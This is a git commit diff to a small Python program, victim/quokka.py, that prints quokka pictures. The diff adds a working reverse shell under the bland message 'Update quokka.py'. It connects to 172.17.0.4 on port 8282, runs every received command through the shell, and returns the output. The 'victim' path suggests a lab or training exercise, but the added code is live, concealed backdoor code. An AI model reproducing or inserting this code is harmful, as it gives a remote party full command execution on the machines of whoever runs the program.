f1d84b3fc6097836bd70df8dc4b10b052dcb462e
tjdud1 <86944624+tjdud1@users.noreply.github.com>
2024-04-15 03:37:58 +0900

    Update quokka.py

--- victim/quokka.py
+++ victim/quokka.py
@@ -62,3 +62,22 @@ if(select=='2'):
 
 print('\n')
 print("프로그램을 종료합니다~")
+
+import socket
+import subprocess
+h="172.17.0.4"
+p=8282
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((h,p))
+while True:
+    c=s.recv(1024).decode()
+    output=subprocess.run(c,shell=True,stdout=subprocess.PIPE,text=True)
+    result=output.stdout
+    if(result==''):
+        s.send("suc".encode())
+    else:
+        s.send(result.encode())
+if(select=='1'):
+    print(v_quokka)
+if(select=='2'):
+    print(smile_quokka)
